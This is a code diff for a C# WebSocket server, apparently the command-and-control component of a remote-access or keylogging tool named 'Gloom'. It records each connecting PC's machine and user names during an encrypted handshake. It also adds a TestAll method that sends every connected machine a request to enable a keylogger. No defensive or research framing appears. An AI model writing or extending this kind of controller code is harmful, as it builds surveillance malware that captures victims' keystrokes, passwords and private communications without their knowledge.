@@ -25,7 +25,7 @@ namespace Gloom
 			socket.OnOpen = () => OnOpen(socket);
 			socket.OnBinary = data => OnMessage(socket, data);
 			socket.OnClose = () => OnClose(socket);
-			socket.OnError = ex => Console.WriteLine("Socket error: " + ex);
+			socket.OnError = ex => OnError(socket, ex);
 		}
 
 		public void OnOpen(IWebSocketConnection socket)
@@ -34,18 +34,25 @@ namespace Gloom
 			sockets.Add(socket);
 		}
 
+		public void OnError(IWebSocketConnection socket, Exception ex)
+		{
+			Console.WriteLine("Socket error: " + ex);
+			sockets.Remove(socket);
+		}
+
 		public void OnMessage(IWebSocketConnection socket, byte[] frame)
 		{
-			var guid = OpFrame.GetGuid(frame);
-			Console.WriteLine("Received message. Guid is " + guid);
-			if (guid == OpFrame.ClientHandshake)
+			var guid = frame.GetGuid();
+			if (guid == OpCodes.ClientHandshake)
 			{
-				encryptor.SetPublicKey(OpFrame.GetData(frame));
+				var hs = StructConvert.Byte2Struct<HandshakeData.ClientHandshake>(frame.GetData());
+				Console.WriteLine("PC '" + hs.PcName + "' -> User '" + hs.UserName + "' trying to connect.");
+				encryptor.SetPublicKey(hs.PublicKeySpec[..((int)hs.PublicKeyLength)]);
 #if DEBUG
 				Console.WriteLine("Key exchange successful.");
 #endif
 				var exported = encryptor.ExportEncryptedSecret();
-				var encsecret = OpFrame.ServerHandshake.CreateOp(exported);
+				var encsecret = OpCodes.ServerHandshake.NewPayload(exported);
 				socket.Send(encsecret);
 			}
 		}
@@ -54,6 +61,14 @@ namespace Gloom
 		{
 			Console.WriteLine("A pc disconnected.");
 			sockets.Remove(socket);
+		}
+
+		public void TestAll()
+		{
+			foreach (IWebSocketConnection socket in sockets)
+			{
+				socket.Send(OpCodes.KeyLogRequest.NewPayload(StructConvert.Struct2Bytes(new KeyLoggerData.KeyLoggerRequest { RequestType = KeyLoggerData.EnableKeyLogger })));
+			}
 		}
 
 		public async void Finish()
